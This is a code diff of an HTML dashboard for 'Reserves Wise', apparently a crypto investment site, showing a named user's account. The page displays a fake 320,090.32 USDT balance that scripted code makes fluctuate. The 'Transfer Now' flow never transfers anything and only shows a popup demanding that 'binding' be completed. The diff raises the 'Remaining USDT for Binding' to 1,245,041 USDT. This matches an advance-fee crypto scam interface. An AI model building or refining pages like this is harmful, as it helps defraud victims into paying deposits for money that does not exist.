@@ -2,106 +2,99 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
   <title>Yasin Yildirim | Reserves Wise</title>
-  <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@700&family=Montserrat:wght@400;500;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@700&family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
   <style>
     * { margin:0; padding:0; box-sizing:border-box; }
     body, html {
       height: 100%;
       font-family: 'Montserrat', sans-serif;
       color: #e0f7ff;
-      overflow: hidden;
+      overflow-x: hidden;
       background: #000;
     }
 
     .container {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
+      display: flex;
+      flex-direction: column;
       height: 100%;
     }
 
     .left {
-      background: url('logo.png') center/cover no-repeat;
-      position: relative;
-    }
-    .left::before {
-      content: '';
-      position: absolute;
-      top: 0; left: 0; width: 100%; height: 100%;
-      background: linear-gradient(to right, rgba(0, 10, 30, 0.92), transparent);
+      display: none;
     }
 
     .right {
       background: linear-gradient(135deg, rgba(0, 20, 60, 0.98), rgba(0, 10, 40, 0.99));
-      padding: 25px;
+      padding: 16px;
       display: flex;
       flex-direction: column;
-      gap: 18px;
+      gap: 14px;
       overflow-y: auto;
-      position: relative;
+      height: 100%;
     }
 
     .logout {
       position: absolute;
-      top: 18px;
-      right: 18px;
+      top: 12px;
+      right: 12px;
       background: linear-gradient(135deg, #1e40af, #3b82f6);
       color: white;
-      padding: 10px 18px;
+      padding: 8px 14px;
       border-radius: 30px;
       text-decoration: none;
-      font-weight: 700;
-      font-size: 14px;
-      box-shadow: 0 6px 20px rgba(30, 136, 229, 0.5);
+      font-weight: 600;
+      font-size: 12px;
+      box-shadow: 0 4px 12px rgba(30, 136, 229, 0.4);
       z-index: 9999;
       transition: 0.3s;
     }
     .logout:hover {
-      background: linear-gradient(135deg, #1e3a8a, #2563eb);
-      transform: translateY(-2px);
+      transform: translateY(-1px);
     }
 
     .glass-card {
       background: rgba(10, 30, 70, 0.45);
-      backdrop-filter: blur(20px) saturate(200%);
-      -webkit-backdrop-filter: blur(20px) saturate(200%);
-      border-radius: 20px;
-      padding: 22px;
-      border: 2px solid rgba(100, 181, 246, 0.4);
-      box-shadow: 0 15px 40px rgba(0, 30, 80, 0.6), 0 0 30px rgba(100, 181, 246, 0.3);
-      transition: all 0.4s ease;
-    }
-    .glass-card:hover {
-      transform: translateY(-5px);
-      border-color: rgba(100, 181, 246, 0.6);
+      backdrop-filter: blur(18px) saturate(180%);
+      -webkit-backdrop-filter: blur(18px) saturate(180%);
+      border-radius: 16px;
+      padding: 16px;
+      border: 1.5px solid rgba(100, 181, 246, 0.35);
+      box-shadow: 0 10px 25px rgba(0, 30, 80, 0.5);
+      transition: all 0.3s ease;
     }
 
     .header h1 {
       font-family: 'Cinzel', serif;
-      font-size: 28px;
+      font-size: 22px;
       background: linear-gradient(135deg, #64b5f6, #42a5f5);
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
-      text-shadow: 0 0 15px rgba(100, 181, 246, 0.5);
-      letter-spacing: 2px;
       text-align: center;
+      letter-spacing: 1.2px;
+      margin-bottom: 4px;
+    }
+    .header p {
+      font-size: 11px;
+      color: #90caf9;
+      text-align: center;
+      font-weight: 500;
     }
 
     .ticker {
-      padding: 14px;
+      padding: 10px;
       text-align: center;
-      font-family: 'Cinzel', serif;
-      font-size: 14px;
+      font-size: 11px;
       background: rgba(10, 25, 50, 0.5);
-      border-radius: 14px;
+      border-radius: 12px;
       overflow: hidden;
       white-space: nowrap;
       border: 1px solid rgba(100, 181, 246, 0.3);
     }
     .ticker-inner {
       display: inline-block;
-      animation: scroll 45s linear infinite;
+      animation: scroll 35s linear infinite;
     }
     @keyframes scroll {
       0% { transform: translateX(0); }
@@ -110,157 +103,166 @@
 
     .current-amount { text-align: center; }
     .main-amount {
-      font-size: 38px;
+      font-size: 28px;
       font-family: 'Cinzel', serif;
       font-weight: 700;
       color: #fff;
-      text-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
-      margin-bottom: 8px;
+      text-shadow: 0 0 15px rgba(255, 255, 255, 0.4);
+      margin-bottom: 6px;
     }
     .ready-transfer {
-      font-size: 16px;
+      font-size: 13px;
       color: #42a5f5;
-      margin: 8px 0;
+      margin: 6px 0;
       font-weight: 600;
     }
     .transfer-stage {
-      display: flex; align-items: center; justify-content: center; gap: 8px;
-      font-size: 14px; color: #ffca28; background: rgba(255, 202, 40, 0.2);
-      padding: 8px 18px; border-radius: 30px; width: fit-content; margin: 0 auto;
+      display: flex; align-items: center; justify-content: center; gap: 6px;
+      font-size: 12px; color: #ffca28; background: rgba(255, 202, 40, 0.2);
+      padding: 6px 14px; border-radius: 30px; width: fit-content; margin: 0 auto;
       border: 1px solid rgba(255, 202, 40, 0.4);
     }
-    .transfer-stage i { animation: spin 1.5s linear infinite; }
+    .transfer-stage i { animation: spin 1.5s linear infinite; font-size: 10px; }
     @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
 
-    /* TRANSFER NOW BUTTON */
     .transfer-btn {
-      margin-top: 12px;
-      padding: 12px 24px;
+      margin-top: 10px;
+      padding: 10px 20px;
       background: linear-gradient(135deg, #10b981, #34d399);
       color: white;
       border: none;
       border-radius: 30px;
       font-weight: 700;
-      font-size: 14px;
+      font-size: 13px;
       cursor: pointer;
       width: fit-content;
       margin-left: auto;
       margin-right: auto;
-      box-shadow: 0 6px 20px rgba(16, 185, 129, 0.4);
-      transition: 0.3s;
+      box-shadow: 0 4px 12px rgba(16, 185, 129, 0.4);
     }
     .transfer-btn:hover {
-      background: linear-gradient(135deg, #059669, #10b981);
-      transform: translateY(-2px);
+      transform: translateY(-1px);
     }
 
-    /* DROPDOWN */
     .dropdown {
-      margin-top: 10px;
-      padding: 16px;
+      margin-top: 8px;
+      padding: 12px;
       background: rgba(255, 255, 255, 0.08);
-      border-radius: 14px;
+      border-radius: 12px;
       border: 1px solid rgba(100, 181, 246, 0.4);
       display: none;
     }
     .dropdown input {
       width: 100%;
-      padding: 12px;
+      padding: 10px;
       background: rgba(255, 255, 255, 0.1);
       border: 1px solid rgba(100, 181, 246, 0.5);
       color: white;
-      border-radius: 10px;
-      font-size: 14px;
-      margin-bottom: 10px;
+      border-radius: 8px;
+      font-size: 13px;
+      margin-bottom: 8px;
     }
     .dropdown button {
       background: linear-gradient(135deg, #3b82f6, #1d4ed8);
-      padding: 10px 20px;
+      padding: 8px 16px;
       border: none;
-      border-radius: 10px;
+      border-radius: 8px;
       color: white;
       font-weight: 600;
+      font-size: 13px;
       cursor: pointer;
     }
 
     .stats {
       display: grid;
       grid-template-columns: 1fr 1fr;
-      gap: 16px;
+      gap: 12px;
       position: relative;
     }
     .stat-box {
       text-align: center;
-      padding: 16px;
+      padding: 12px;
       background: rgba(255, 255, 255, 0.05);
-      border-radius: 14px;
+      border-radius: 12px;
       border: 1px solid rgba(100, 181, 246, 0.3);
     }
-    .stat-box h3 { font-size: 13px; color: #90caf9; margin-bottom: 6px; }
-    .stat-box p { font-size: 20px; font-family: 'Cinzel', serif; font-weight: 700; color: #fff; }
+    .stat-box h3 {
+      font-size: 11px;
+      color: #90caf9;
+      margin-bottom: 4px;
+      font-weight: 500;
+    }
+    .stat-box p {
+      font-size: 15px;
+      font-family: 'Cinzel', serif;
+      font-weight: 700;
+      color: #fff;
+    }
 
     .binding-alert {
       position: absolute;
-      top: -12px;
+      top: -10px;
       left: 50%;
       transform: translateX(-50%);
       background: linear-gradient(135deg, #dc2626, #ef4444);
       color: white;
-      padding: 6px 16px;
+      padding: 4px 12px;
       border-radius: 30px;
-      font-size: 12px;
+      font-size: 10px;
       font-weight: 700;
-      box-shadow: 0 4px 15px rgba(220, 38, 38, 0.5);
+      box-shadow: 0 3px 10px rgba(220, 38, 38, 0.5);
       white-space: nowrap;
       z-index: 10;
       animation: pulse-red 2s infinite;
     }
-    @keyframes pulse-red { 0%, 100% { transform: translateX(-50%) scale(1); } 50% { transform: translateX(-50%) scale(1.05); } }
+    @keyframes pulse-red { 0%, 100% { transform: translateX(-50%) scale(1); } 50% { transform: translateX(-50%) scale(1.03); } }
 
     .binding-info {
       text-align: center;
-      margin-top: 12px;
+      margin-top: 10px;
       color: #90caf9;
-      font-size: 13px;
+      font-size: 11px;
     }
     .binding-info span { color: #64b5f6; font-weight: 700; }
 
-    .updates { display: grid; gap: 14px; }
+    .updates { display: grid; gap: 12px; }
     .update-item {
-      padding: 16px;
+      padding: 12px;
       background: rgba(255, 255, 255, 0.07);
-      border-left: 4px solid #42a5f5;
-      border-radius: 0 12px 12px 0;
+      border-left: 3px solid #42a5f5;
+      border-radius: 0 10px 10px 0;
     }
-    .update-item h4 { color: #64b5f6; font-size: 15px; margin-bottom: 6px; font-weight: 600; }
-    .update-item p { font-size: 13px; color: #bbdefb; line-height: 1.5; }
+    .update-item h4 { color: #64b5f6; font-size: 13px; margin-bottom: 4px; font-weight: 600; }
+    .update-item p { font-size: 11px; color: #bbdefb; line-height: 1.4; }
 
     .footer-links {
       margin-top: auto;
       display: flex;
-      justify-content: space-between;
-      padding: 16px 20px;
+      flex-direction: column;
+      gap: 10px;
+      padding: 14px 16px;
       background: rgba(10, 25, 50, 0.5);
-      backdrop-filter: blur(14px);
-      border-radius: 16px;
-      border: 1.5px solid rgba(100, 181, 246, 0.3);
-      font-size: 13px;
+      backdrop-filter: blur(12px);
+      border-radius: 14px;
+      border: 1.2px solid rgba(100, 181, 246, 0.3);
+      font-size: 11px;
+      text-align: center;
     }
     .footer-links a { color: #90caf9; text-decoration: none; font-weight: 500; }
     .footer-links a:hover { color: #64b5f6; }
 
-    /* PROFESSIONAL POPUP - MINIMAL & SMOOTH */
+    /* MOBILE POPUP */
     .popup {
       position: fixed;
       top: 0; left: 0; width: 100%; height: 100%;
-      background: rgba(0, 0, 0, 0.88);
+      background: rgba(0, 0, 0, 0.9);
       display: flex;
       align-items: center;
       justify-content: center;
       z-index: 99999;
       opacity: 0;
       visibility: hidden;
-      transition: opacity 0.6s ease;
+      transition: opacity 0.4s ease;
     }
     .popup.show {
       opacity: 1;
@@ -268,73 +270,79 @@
     }
     .popup-content {
       background: rgba(10, 25, 50, 0.92);
-      backdrop-filter: blur(25px);
-      padding: 40px;
-      border-radius: 24px;
+      backdrop-filter: blur(20px);
+      padding: 30px 20px;
+      border-radius: 20px;
       text-align: center;
-      border: 1.5px solid rgba(100, 181, 246, 0.4);
-      box-shadow: 0 20px 50px rgba(0, 30, 80, 0.7);
-      transform: translateY(20px);
-      opacity: 0;
-      transition: all 0.6s ease;
-      max-width: 90%;
+      border: 2px solid #10b981;
+      box-shadow: 0 15px 35px rgba(0, 30, 80, 0.6);
+      transform: scale(0.85);
+      transition: transform 0.4s ease;
+      max-width: 85%;
     }
     .popup.show .popup-content {
-      transform: translateY(0);
-      opacity: 1;
+      transform: scale(1);
     }
 
-    .popup .icon {
-      width: 80px;
-      height: 80px;
-      background: #10b981;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin: 0 auto 20px;
-      font-size: 40px;
-      color: white;
-      box-shadow: 0 0 30px rgba(16, 185, 129, 0.5);
+    .popup .emoji {
+      font-size: 50px;
+      margin-bottom: 14px;
+      color: #10b981;
     }
 
     .popup h2 {
       font-family: 'Cinzel', serif;
-      font-size: 28px;
-      color: #64b5f6;
-      margin-bottom: 12px;
-      letter-spacing: 1.5px;
+      font-size: 20px;
+      color: #10b981;
+      margin-bottom: 8px;
+      letter-spacing: 1px;
     }
 
     .popup p {
-      font-size: 16px;
+      font-size: 13px;
       color: #bbf7d0;
-      margin-bottom: 28px;
+      margin-bottom: 20px;
       font-weight: 500;
     }
 
     .popup button {
-      background: linear-gradient(135deg, #1e40af, #3b82f6);
-      padding: 12px 32px;
+      background: linear-gradient(135deg, #10b981, #059669);
+      padding: 10px 24px;
       border: none;
-      border-radius: 14px;
+      border-radius: 12px;
       color: white;
       font-weight: 700;
-      font-size: 15px;
+      font-size: 13px;
       cursor: pointer;
-      box-shadow: 0 6px 20px rgba(30, 136, 229, 0.4);
-      transition: 0.3s;
-    }
-    .popup button:hover {
-      background: linear-gradient(135deg, #1e3a8a, #2563eb);
-      transform: translateY(-2px);
+      box-shadow: 0 4px 12px rgba(16, 185, 129, 0.5);
     }
 
-    @media (max-width: 768px) {
-      .popup-content { padding: 35px; }
-      .popup .icon { width: 70px; height: 70px; font-size: 35px; }
-      .popup h2 { font-size: 24px; }
-      .popup p { font-size: 15px; }
+    /* DESKTOP ONLY */
+    @media (min-width: 769px) {
+      .container { display: grid; grid-template-columns: 1fr 1fr; }
+      .left {
+        display: block;
+        background: url('logo.png') center/cover no-repeat;
+        position: relative;
+      }
+      .left::before {
+        content: '';
+        position: absolute;
+        top: 0; left: 0; width: 100%; height: 100%;
+        background: linear-gradient(to right, rgba(0, 10, 30, 0.92), transparent);
+      }
+      .right { padding: 25px; gap: 18px; }
+      .main-amount { font-size: 38px; }
+      .ready-transfer { font-size: 16px; }
+      .transfer-btn { padding: 12px 24px; font-size: 14px; }
+      .stat-box h3 { font-size: 13px; }
+      .stat-box p { font-size: 20px; }
+      .binding-alert { top: -12px; font-size: 12px; padding: 6px 16px; }
+      .popup-content { padding: 45px; max-width: 500px; }
+      .popup .emoji { font-size: 70px; }
+      .popup h2 { font-size: 30px; }
+      .popup p { font-size: 16px; }
+      .popup button { padding: 12px 28px; font-size: 15px; }
     }
   </style>
 </head>
@@ -355,19 +363,18 @@
 
       <div class="glass-card header">
         <h1>YASIN YILDIRIM</h1>
-        <p style="text-align:center;font-size:14px;color:#90caf9;font-weight:500;">Account Dashboard • Reserves Wise</p>
+        <p>Account Dashboard • Reserves Wise</p>
       </div>
 
       <!-- MAIN BALANCE + TRANSFER NOW -->
       <div class="glass-card current-amount">
         <div class="main-amount" id="mainBalance">320,090.32 USDT</div>
         <div class="ready-transfer" id="readyTransfer">Ready to Transfer: 320,090.32 USDT</div>
-        <div class="transfer-stage"><span>Transfer Stage: Processing</span></div>
+        <div class="transfer-stage">Transfer Stage: Processing</div>
         <button class="transfer-btn" onclick="toggleDropdown()">Transfer Now</button>
 
-        <!-- DROPDOWN -->
         <div class="dropdown" id="transferDropdown">
-          <input type="text" placeholder="Enter BNB Smart Chain Wallet Address" id="walletInput" />
+          <input type="text" placeholder="Enter BNB Smart Chain Wallet" id="walletInput" />
           <button onclick="proceedTransfer()">Proceed</button>
         </div>
       </div>
@@ -377,16 +384,16 @@
         <div class="binding-alert">Binding Request Restarted</div>
         <div class="stats">
           <div class="stat-box">
-            <h3>BINDING USDT RECEIVED</h3>
-            <p>1490 + 10 USDT</p>
+            <h3>RECEIVED AMOUNT</h3>
+            <p>872,090.50 USDT</p>
           </div>
           <div class="stat-box">
-            <h3>BINDING USDT REMAINING</h3>
-            <p>10,000 USDT</p>
+            <h3>PENDING AMOUNT</h3>
+            <p>372,950.50 USDT</p>
           </div>
         </div>
         <div class="binding-info">
-          <strong>Remaining USDT for Binding:</strong> <span>10,000.00 USDT</span>
+          <strong>Remaining USDT for Binding:</strong> <span>1,245,041.00 USDT</span>
         </div>
       </div>
 
@@ -403,18 +410,18 @@
           <a href="mailto:support@reserveswise.world">support@reserveswise.world</a><br>
           <a href="mailto:compliance@reserveswise.world">compliance@reserveswise.world</a>
         </div>
-        <div style="text-align:right;">
+        <div>
           <strong>About Us:</strong><br>
-          <span style="font-size:12px;color:#bbdefb;">Global USDT Reserve Network</span>
+          Global USDT Reserve Network
         </div>
       </div>
     </div>
   </div>
 
-  <!-- PROFESSIONAL POPUP -->
+  <!-- MOBILE POPUP -->
   <div class="popup" id="successPopup">
     <div class="popup-content">
-      <div class="icon">🪙</div>
+      <div class="emoji">Checkmark</div>
       <h2>COMPLETE BINDING TO TRANSFER</h2>
       <p>320,090.32 USDT ready for BNB Smart Chain transfer.</p>
       <button onclick="closePopup()">Close</button>
@@ -424,7 +431,6 @@
   <script>
     if (!localStorage.getItem('loggedIn')) window.location = 'index.html';
 
-    // LIVE READY TO TRANSFER
     const baseReady = 320090.32;
     function formatUSDT(num) {
       return num.toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, ",") + " USDT";
@@ -438,18 +444,19 @@
     setInterval(fluctuateReady, 1000);
     fluctuateReady();
 
-    // DROPDOWN
     function toggleDropdown() {
       const dropdown = document.getElementById('transferDropdown');
       dropdown.style.display = dropdown.style.display === 'block' ? 'none' : 'block';
     }
 
-    // PROFESSIONAL POPUP
     function proceedTransfer() {
       const wallet = document.getElementById('walletInput').value.trim();
       if (wallet && wallet.length > 20 && wallet.startsWith('0x')) {
         const popup = document.getElementById('successPopup');
         popup.classList.add('show');
+        setTimeout(() => {
+          document.querySelector('.popup-content').style.transform = 'scale(1)';
+        }, 50);
       } else {
         alert('Please enter a valid BNB Smart Chain wallet address (starts with 0x).');
       }
